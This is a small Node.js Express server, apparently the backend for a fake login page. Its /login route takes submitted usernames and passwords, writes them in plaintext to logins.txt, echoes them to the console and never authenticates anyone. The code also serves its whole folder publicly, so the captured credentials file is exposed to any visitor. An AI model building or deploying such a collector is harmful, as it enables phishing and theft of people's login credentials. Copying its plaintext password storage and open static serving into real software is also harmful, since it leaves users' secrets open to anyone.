const express = require("express");
const fs = require("fs");
const path = require("path");

const app = express();
const port = 3000;

app.use(express.json());
app.use(express.static(__dirname)); // allow access to files in current folder


// Serve static files (html, css, js) from current directory
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

app.get("/styles.css", (req, res) => {
  res.sendFile(path.join(__dirname, "styles.css"));
});

app.get("/script.js", (req, res) => {
  res.sendFile(path.join(__dirname, "script.js"));
});

// Handle POST request from form
app.post("/login", (req, res) => {
  const { username, password } = req.body;
  const logEntry = `Username: ${username}, Password: ${password}\n`;

  fs.appendFile("logins.txt", logEntry, (err) => {
    if (err) {
      console.error("Failed to write login:", err);
      return res.status(500).send("Failed to save.");
    }
    console.log("Login saved:", logEntry.trim());
    res.send("Data received.");
  });
});

app.listen(port, () => {
  console.log(`✅ Server running at http://localhost:${port}`);
});
